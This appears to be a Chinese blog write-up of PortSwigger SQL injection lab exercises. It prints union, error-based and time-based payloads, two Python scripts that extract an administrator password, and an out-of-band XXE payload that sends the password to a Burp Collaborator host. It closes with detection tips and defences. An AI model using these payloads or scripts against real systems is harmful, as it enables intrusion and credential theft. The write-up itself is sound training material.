@@ -1,0 +1,300 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Burpsuite靶场----SQL注入专题 | Evylnk</title><meta name="author" content="Evylnk"><meta name="copyright" content="Evylnk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这里主要是个人笔记，记录一些我个人要记录的点，不算是完整的write up burpsuite给了一个很好的各种sql语句差别的整合 https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;sql-injection&#x2F;cheat-sheet Lab: SQL injection attack, querying the database type and version on">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burpsuite靶场----SQL注入专题">
+<meta property="og:url" content="http://emion.fun/2022/03/02/burp_sql/index.html">
+<meta property="og:site_name" content="Evylnk">
+<meta property="og:description" content="这里主要是个人笔记，记录一些我个人要记录的点，不算是完整的write up burpsuite给了一个很好的各种sql语句差别的整合 https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;sql-injection&#x2F;cheat-sheet Lab: SQL injection attack, querying the database type and version on">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg">
+<meta property="article:published_time" content="2022-03-02T12:36:45.594Z">
+<meta property="article:modified_time" content="2022-03-05T09:24:36.862Z">
+<meta property="article:author" content="Evylnk">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="http://emion.fun/2022/03/02/burp_sql/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Burpsuite靶场----SQL注入专题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-05 17:24:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evylnk</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Burpsuite靶场----SQL注入专题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-02T12:36:45.594Z" title="发表于 2022-03-02 20:36:45">2022-03-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-05T09:24:36.862Z" title="更新于 2022-03-05 17:24:36">2022-03-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Burpsuite靶场----SQL注入专题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><hr>
+<p><strong>这里主要是个人笔记，记录一些我个人要记录的点，不算是完整的write up</strong></p>
+<p><strong>burpsuite给了一个很好的各种sql语句差别的整合</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></strong></p>
+<h1 id="Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="Lab: SQL injection attack, querying the database type and version on Oracle"></a>Lab: SQL injection attack, querying the database type and version on Oracle</h1><p><strong>在oracle数据库中，每个select语句后都必须指定选择的表名，恰好oracle中有一个内置的<code>dual</code>表</strong></p>
+<p><strong>可以尝试这样</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;</span>lnk<span class="string">&#x27;,&#x27;</span>zing<span class="string">&#x27; from dual --</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>查询oracle数据库版本</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version</span><br><span class="line"><span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select banner,&#x27;</span>cnc<span class="string">&#x27; from v$version --</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="SQL injection attack, listing the database contents on Oracle"></a>SQL injection attack, listing the database contents on Oracle</h1><p><strong>查询oracle数据库的的表和段</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;TABLE-NAME-HERE&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Lab-Blind-SQL-injection-with-conditional-responses"><a href="#Lab-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Lab: Blind SQL injection with conditional responses"></a>Lab: Blind SQL injection with conditional responses</h1><p><strong>盲注脚本</strong></p>
+<p><strong>其实用burpsuite跑很快就跑出结果了，python会慢一些，但是burp不能把字符串拼接起来</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_sql_injection</span>(<span class="params">url, length</span>):</span></span><br><span class="line">    password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">        base_cookie = <span class="string">f&quot;TrackingId=XN8KvPf0TbIGabZ6&#x27; and (select ascii(substring(password, %s, 1)) from users where username=&#x27;administrator&#x27; )=&#x27;[char]&#x27; --; session=aMdbiac40Bds8bKv3FE85vvVBsjwscrK&quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">123</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;payload--&gt;digit:%s with &quot;</span> % <span class="built_in">str</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            cookie = base_cookie.replace(<span class="string">&quot;[char]&quot;</span>, <span class="built_in">str</span>(j))</span><br><span class="line">            headers[<span class="string">&#x27;cookie&#x27;</span>] = cookie</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Welcome back&quot;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">                password += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;password--&gt;&quot;</span>, password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://ac241fb81ede6a4cc09132c900460036.web-security-academy.net/&quot;</span></span><br><span class="line">blind_sql_injection(url, <span class="number">20</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>这里我就只截一部分图了，懒得跑下去了，太慢了</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzxssr6fqdj20pq0b80tw.jpg"></p>
+<h1 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a>Lab: Blind SQL injection with conditional errors</h1><p><strong>错误条件的盲注</strong></p>
+<p>首先加单引号报错，然后加个注释发现正常，所以判断SQL语句为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> trick_id <span class="keyword">from</span> trick_tab <span class="keyword">where</span> trick<span class="operator">=</span><span class="string">&#x27;vQdcV0dBQuBUyGx9&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后判断数据库，首先查询一个空值</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;&#x27; --</span></span><br></pre></td></tr></table></figure>
+
+<p>然后尝试oracle的dual表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;&#x27; from dual --</span></span><br></pre></td></tr></table></figure>
+
+<p>页面正常，所以数据库为oracle</p>
+<p>接着我们尝试去一个不存在的表中查询，发现又报错，这个很明显后端在把我们输入的语句当作代码执行</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">from</span> lnk</span><br></pre></td></tr></table></figure>
+
+<p><strong>这题和上面类似，只是将响应字符串取代为报错响应</strong></p>
+<p><strong>于是我们参考构造payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select case when(1=1) then to_char(1/0) else null end from users --</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>值得注意的是，当when中条件为真时，返回500，为假时，页面才是正常，这和上面刚好是相反的</strong></p>
+<p>一样的，首先用burp爆破出密码长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select case when(username=&#x27;administrator&#x27; and length(password)=1) then to_char(1/0) else null end from users --</span><br></pre></td></tr></table></figure>
+
+<p>结果如下，长度是20</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzyuok4asij214t0u079v.jpg"></p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_sql_injection</span>(<span class="params">url, length</span>):</span></span><br><span class="line">	password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	headers = &#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">		base_cookie = <span class="string">f&quot;TrackingId=PnmnAqssW0voE21g&#x27; union select case when (username=&#x27;administrator&#x27; and ascii(substr(password, %s, 1))=[char]) then to_char(1/0) else null end from users --; session=ZTFD8NTb6aoJjWU0ENRuwMHso9ySKox2&quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">123</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;payload--&gt;digit%s with &quot;</span> % <span class="built_in">str</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">			cookie = base_cookie.replace(<span class="string">&quot;[char]&quot;</span>, <span class="built_in">str</span>(j))</span><br><span class="line">			headers[<span class="string">&quot;cookie&quot;</span>] = cookie</span><br><span class="line">			r = requests.get(url, headers=headers)</span><br><span class="line">			<span class="keyword">if</span> <span class="number">500</span> == r.status_code:</span><br><span class="line">				password += <span class="built_in">chr</span>(j)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;password--&gt;&quot;</span>, password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://ac6d1f6a1ea307acc1c50c14006000ca.web-security-academy.net/&quot;</span></span><br><span class="line">length = <span class="number">20</span></span><br><span class="line">blind_sql_injection(url, length)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="Lab: Blind SQL injection with time delays and information retrieval"></a>Lab: Blind SQL injection with time delays and information retrieval</h1><p><strong>时间盲注，用burp cheat sheet给的payload fuzz下数据库，发现是PostgreSQL</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzyy50zhkpj216b0u0n3q.jpg"></p>
+<p><strong>接着用类似的payload测试延时注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; || (select case when (1=1) then pg_sleep(1) else pg_sleep(0) end from users) --</span></span><br></pre></td></tr></table></figure>
+
+<p>burp测试一下，password长度还是20</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; || (select case when (username=&#x27;</span>administrator<span class="string">&#x27; and length(password)=20) then pg_sleep(1) else pg_sleep(0) end from users) --</span></span><br></pre></td></tr></table></figure>
+
+<p>这里python脚本的timeout和sleep不太一样，我暂时还爆破不出来，如果有知道的师傅希望能告诉我一下（🏀⚽️了</p>
+<p>用burp爆破只能开1个线程，开多了也会导致有错误，反正就挺恶心挺费时的这题</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzz0cr9jkbj214t0u0jxd.jpg"></p>
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+||+(select+case+when+(username=&#x27;</span>administrator<span class="string">&#x27;+and+substring(password,§1§,1)=&#x27;</span>§a§<span class="string">&#x27;)+then+pg_sleep(2)+else+pg_sleep(0)+end+from+users)+--</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Lab-Blind-SQL-injection-with-out-of-band-interaction"><a href="#Lab-Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="Lab: Blind SQL injection with out-of-band interaction"></a>Lab: Blind SQL injection with out-of-band interaction</h1><h2 id="利用带外-OAST-技术发动盲注"><a href="#利用带外-OAST-技术发动盲注" class="headerlink" title="利用带外(OAST)技术发动盲注"></a>利用带外(OAST)技术发动盲注</h2><p><strong>点击burp的Burp Coolaborator client生成一个临时地址，发送给你的好友，他们点击之后就会收到一些信息</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzz3bhnhq8j213q07amxk.jpg"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzz3bsxoi0j21000min1u.jpg"></p>
+<p><strong>看ua头可以看到对方的一些设备基本信息</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>这个是burp给的一个payload模板，打过去就可过这个lab</p>
+<p><strong>第二个实验就是用oast技术泄漏出信息</strong></p>
+<p><strong>我们可以在上面模板中的域名里写入sql语句带出查询的数据</strong></p>
+<p><strong>payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(select password from users where username=&#x27;administrator&#x27;)||&#x27;~cp5gpi5bar1xg1c1n8t3ehnk5bb1zq.burpcollaborator.net/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzz42pz9frj212p0u0gpl.jpg"></p>
+<p><strong>这样就带出了密码</strong></p>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p><strong>burp的这张图很形象的展示了二次注入的基本利用</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzz47o9jv5j21cg0p8n1q.jpg"></p>
+<p><strong>首先查询一个正常的，接着以分号为界，后面的又会被当作sql语句去执行</strong></p>
+<h1 id="总结和检测sql注入以及防御"><a href="#总结和检测sql注入以及防御" class="headerlink" title="总结和检测sql注入以及防御"></a>总结和检测sql注入以及防御</h1><ul>
+<li><strong>可以通过工具比如burp和sqlmap进行检测sql注入</strong></li>
+<li><strong>添加单引号’等字符查看是否有报错信息</strong></li>
+<li><strong>提交一些特定sql语句，输入一些基本的值和其他的值，观察系统页面响应是否有变化或者差异</strong></li>
+<li><strong>利用bool条件<code>or 1 = 1</code> 和<code>or 1 = 2</code>判断页面响应是否不一样</strong></li>
+<li><strong>提交一些触发延时的payload看页面响应是否同延时有关</strong></li>
+<li><strong>利用OAST payloads ，监视是否有交互</strong></li>
+</ul>
+<p><strong>一些sql注入的点</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzz4h1irvwj210e078wfe.jpg"></p>
+<h2 id="一些数据库的不同造成的差异"><a href="#一些数据库的不同造成的差异" class="headerlink" title="一些数据库的不同造成的差异"></a>一些数据库的不同造成的差异</h2><p><strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">依然是这个链接</a></strong></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
+<li><strong>一般大部分的sql注入都可以通过预处理语句就是参数化查询来避免</strong></li>
+<li><strong>完善白黑名单</strong></li>
+<li><strong>关闭错误提示</strong></li>
+<li><strong>统一编码</strong></li>
+<li><strong>闭合可控的变量，并且转义</strong></li>
+<li><strong>安装WAF</strong></li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">portswigger sql靶场</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/">对MYSQL注入相关内容及部分Trick的归类小结</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245532#h2-43">梨子带你刷burpsuite靶场系列之服务器端漏洞篇 - Sql注入专题</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://victomteng1997.github.io/2020/07/08/Web-Security-Academy-SQL-Injection-2/">sql盲注python脚本</a></strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Evylnk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://emion.fun/2022/03/02/burp_sql/">http://emion.fun/2022/03/02/burp_sql/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://emion.fun" target="_blank">Evylnk</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/06/burp_authentication/"><img class="prev-cover" src="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Burpsuite靶场----身份认证专题</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/26/tryme/"><img class="next-cover" src="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Introduction to Web Hacking</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Evylnk</div><div class="author-info__description">CTF && PWN && STUDENT</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LHXHL"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/LHXHL" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">愿你有一个灿烂的前程，愿你有情人终成眷属，愿你在尘世中收获幸福。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><span class="toc-number">1.</span> <span class="toc-text">Lab: SQL injection attack, querying the database type and version on Oracle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-injection-attack-listing-the-database-contents-on-Oracle"><span class="toc-number">2.</span> <span class="toc-text">SQL injection attack, listing the database contents on Oracle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-conditional-responses"><span class="toc-number">3.</span> <span class="toc-text">Lab: Blind SQL injection with conditional responses</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 